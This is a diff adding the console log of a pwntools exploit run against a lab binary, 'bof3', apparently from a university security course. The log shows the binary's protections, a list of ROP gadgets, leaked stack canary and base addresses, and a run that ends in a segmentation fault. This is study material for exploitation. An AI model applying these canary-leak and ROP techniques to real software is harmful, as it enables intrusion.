@@ -1,0 +1,147 @@
+[!] Did not find any GOT entries
+[*] '/mnt/ec/ness/jenny/NYCU/312552011_lab05/bof3'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Loaded 124 cached gadgets for './bof3'
+1   0x27c7c   add esp, 0x10; pop rbp; pop r12; pop r13; ret; 
+2   0x7ba77   add esp, 0x10; pop rbp; ret; 
+3   0x19fe6   add esp, 0x10; pop rbx; pop rbp; pop r12; ret; 
+4   0x5a3e7   add esp, 0x10; pop rbx; ret; 
+5   0x589ec   add esp, 0x1018; ret; 
+6   0x6c433   add esp, 0x148; ret; 
+7   0x24b66   add esp, 0x18; pop rbp; pop r12; ret; 
+8   0x12c89   add esp, 0x18; pop rbx; pop rbp; pop r12; pop r13; ret; 
+9   0x1a9c7   add esp, 0x18; pop rbx; pop rbp; ret; 
+10  0x570cd   add esp, 0x18; ret; 
+11  0x7bbad   add esp, 0x20; pop rbx; pop r12; pop r13; ret; 
+12  0x58e50   add esp, 0x20; pop rbx; pop rbp; pop r12; ret; 
+13  0x546b6   add esp, 0x20; pop rbx; ret; 
+14  0x92f66   add esp, 0x28; pop rbx; pop rbp; pop r12; pop r13; ret; 
+15  0x18b57   add esp, 0x28; pop rbx; pop rbp; ret; 
+16  0x5652e   add esp, 0x28; ret; 
+17  0x98d06   add esp, 0x30; pop rbx; pop rbp; pop r12; ret; 
+18  0x8cd55   add esp, 0x30; ret; 
+19  0x1edeb   add esp, 0x38; pop rbx; pop rbp; pop r12; pop r13; ret; 
+20  0x1b382   add esp, 0x38; pop rbx; pop rbp; ret; 
+21  0x6df0f   add esp, 0x38; ret; 
+22  0x560b2   add esp, 0x48; pop rbx; pop rbp; pop r12; pop r13; ret; 
+23  0x57185   add esp, 0x58; ret; 
+24  0x5666c   add esp, 0x68; pop rbp; pop r12; ret; 
+25  0x5703e   add esp, 0x68; ret; 
+26  0x5418b   add esp, 0x70; pop rbx; pop rbp; pop r12; ret; 
+27  0x988a3   add esp, 0x78; pop rbp; pop r12; ret; 
+28  0x7faa5   add esp, 0x78; pop rbx; pop rbp; pop r12; pop r13; ret; 
+29  0x81d77   add esp, 0x78; ret; 
+30  0x58bcd   add esp, 0x88; pop rbx; pop rbp; ret; 
+31  0x985d8   add esp, 0x98; pop rbp; pop r12; ret; 
+32  0xb1ff    add esp, 0x98; ret; 
+33  0x81aff   add esp, 0xa8; pop rbp; pop r12; ret; 
+34  0x129fd   add esp, 0xd8; ret; 
+35  0x18cbd   add esp, 0xe8; pop rbx; pop rbp; ret; 
+36  0x582b9   add esp, 8; pop rbp; pop r12; ret; 
+37  0x1cc02   add esp, 8; pop rbx; pop rbp; pop r12; pop r13; ret; 
+38  0xba27    add esp, 8; pop rbx; pop rbp; ret; 
+39  0x8017    add esp, 8; ret; 
+40  0x27c7b   add rsp, 0x10; pop rbp; pop r12; pop r13; ret; 
+41  0x7ba76   add rsp, 0x10; pop rbp; ret; 
+42  0x19fe5   add rsp, 0x10; pop rbx; pop rbp; pop r12; ret; 
+43  0x5a3e6   add rsp, 0x10; pop rbx; ret; 
+44  0x589eb   add rsp, 0x1018; ret; 
+45  0x6c432   add rsp, 0x148; ret; 
+46  0x24b65   add rsp, 0x18; pop rbp; pop r12; ret; 
+47  0x1a9c6   add rsp, 0x18; pop rbx; pop rbp; ret; 
+48  0x570cc   add rsp, 0x18; ret; 
+49  0x7bbac   add rsp, 0x20; pop rbx; pop r12; pop r13; ret; 
+50  0x58e4f   add rsp, 0x20; pop rbx; pop rbp; pop r12; ret; 
+51  0x546b5   add rsp, 0x20; pop rbx; ret; 
+52  0x18b56   add rsp, 0x28; pop rbx; pop rbp; ret; 
+53  0x5652d   add rsp, 0x28; ret; 
+54  0x98d05   add rsp, 0x30; pop rbx; pop rbp; pop r12; ret; 
+55  0x8cd54   add rsp, 0x30; ret; 
+56  0x1b381   add rsp, 0x38; pop rbx; pop rbp; ret; 
+57  0x6df0e   add rsp, 0x38; ret; 
+58  0x57184   add rsp, 0x58; ret; 
+59  0x5666b   add rsp, 0x68; pop rbp; pop r12; ret; 
+60  0x5703d   add rsp, 0x68; ret; 
+61  0x5418a   add rsp, 0x70; pop rbx; pop rbp; pop r12; ret; 
+62  0x988a2   add rsp, 0x78; pop rbp; pop r12; ret; 
+63  0x81d76   add rsp, 0x78; ret; 
+64  0x58bcc   add rsp, 0x88; pop rbx; pop rbp; ret; 
+65  0xb1fe    add rsp, 0x98; ret; 
+66  0x129fc   add rsp, 0xd8; ret; 
+67  0x18cbc   add rsp, 0xe8; pop rbx; pop rbp; ret; 
+68  0x582b8   add rsp, 8; pop rbp; pop r12; ret; 
+69  0xba26    add rsp, 8; pop rbx; pop rbp; ret; 
+70  0x8016    add rsp, 8; ret; 
+71  0x5e493   int 0x80; 
+72  0x8a62    leave; ret; 
+73  0xbc5d    pop r12; pop r13; pop r14; pop r15; pop rbp; ret; 
+74  0x9178    pop r12; pop r13; pop r14; pop r15; ret; 
+75  0x111e9   pop r12; pop r13; pop r14; ret; 
+76  0x85cf3   pop r12; pop r13; pop rbp; ret; 
+77  0x12c8e   pop r12; pop r13; ret; 
+78  0x95dd    pop r12; ret; 
+79  0xbc5f    pop r13; pop r14; pop r15; pop rbp; ret; 
+80  0x917a    pop r13; pop r14; pop r15; ret; 
+81  0x111eb   pop r13; pop r14; ret; 
+82  0x85cf5   pop r13; pop rbp; ret; 
+83  0x12c90   pop r13; ret; 
+84  0xbc61    pop r14; pop r15; pop rbp; ret; 
+85  0x917c    pop r14; pop r15; ret; 
+86  0x111ed   pop r14; ret; 
+87  0xbc63    pop r15; pop rbp; ret; 
+88  0x917e    pop r15; ret; 
+89  0x8dd8a   pop rax; pop rdx; pop rbx; ret; 
+90  0x57187   pop rax; ret; 
+91  0x9177    pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
+92  0x111e8   pop rbp; pop r12; pop r13; pop r14; ret; 
+93  0x12c8d   pop rbp; pop r12; pop r13; ret; 
+94  0x95dc    pop rbp; pop r12; ret; 
+95  0xbc60    pop rbp; pop r14; pop r15; pop rbp; ret; 
+96  0x917b    pop rbp; pop r14; pop r15; ret; 
+97  0x111ec   pop rbp; pop r14; ret; 
+98  0x85cf6   pop rbp; pop rbp; ret; 
+99  0x90118   pop rbp; pop rbx; ret; 
+100 0x88e3    pop rbp; ret; 
+101 0x85cf2   pop rbx; pop r12; pop r13; pop rbp; ret; 
+102 0x7bbb0   pop rbx; pop r12; pop r13; ret; 
+103 0x120a6   pop rbx; pop r12; ret; 
+104 0x111e7   pop rbx; pop rbp; pop r12; pop r13; pop r14; ret; 
+105 0x12c8c   pop rbx; pop rbp; pop r12; pop r13; ret; 
+106 0x95db    pop rbx; pop rbp; pop r12; ret; 
+107 0xba2a    pop rbx; pop rbp; ret; 
+108 0x8bb0    pop rbx; ret; 
+109 0x58ed7   pop rdi; add rsp, 0x20; pop rbx; pop rbp; pop r12; ret; 
+110 0xbc64    pop rdi; pop rbp; ret; 
+111 0x917f    pop rdi; ret; 
+112 0x8dd8b   pop rdx; pop rbx; ret; 
+113 0xbc62    pop rsi; pop r15; pop rbp; ret; 
+114 0x917d    pop rsi; pop r15; ret; 
+115 0x111ee   pop rsi; ret; 
+116 0xbc5e    pop rsp; pop r13; pop r14; pop r15; pop rbp; ret; 
+117 0x9179    pop rsp; pop r13; pop r14; pop r15; ret; 
+118 0x111ea   pop rsp; pop r13; pop r14; ret; 
+119 0x85cf4   pop rsp; pop r13; pop rbp; ret; 
+120 0x12c8f   pop rsp; pop r13; ret; 
+121 0x95de    pop rsp; ret; 
+122 0x801a    ret; 
+123 0x8f34    syscall; 
+124 0x21c66   syscall; ret; 
+[x] Starting local process './bof3'
+[+] Starting local process './bof3': pid 5143
+[*] Paused (press enter to continue)
+b'Welcome, BBBBBBBBBBBBBBBBBBBBBBBB`\xb7\x9e_\xff\x7f'
+shellcode_addr: 0x7fff5f9eb760
+b'The room number is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x9d\x16\xc7\xed\xca\xee\xb2`\xb7\x9e_\xff\x7f'
+canary: 0xb2eecaedc7169d00
+p64(canary): b'\x00\x9d\x16\xc7\xed\xca\xee\xb2'
+b"The customer's name is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0:\x849\xe3\x7f"
+base: 0x7fe33983b000
+b'Thank you!'
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
+[*] Process './bof3' stopped with exit code -11 (SIGSEGV) (pid 5143)
+[*] Got EOF while sending in interactive
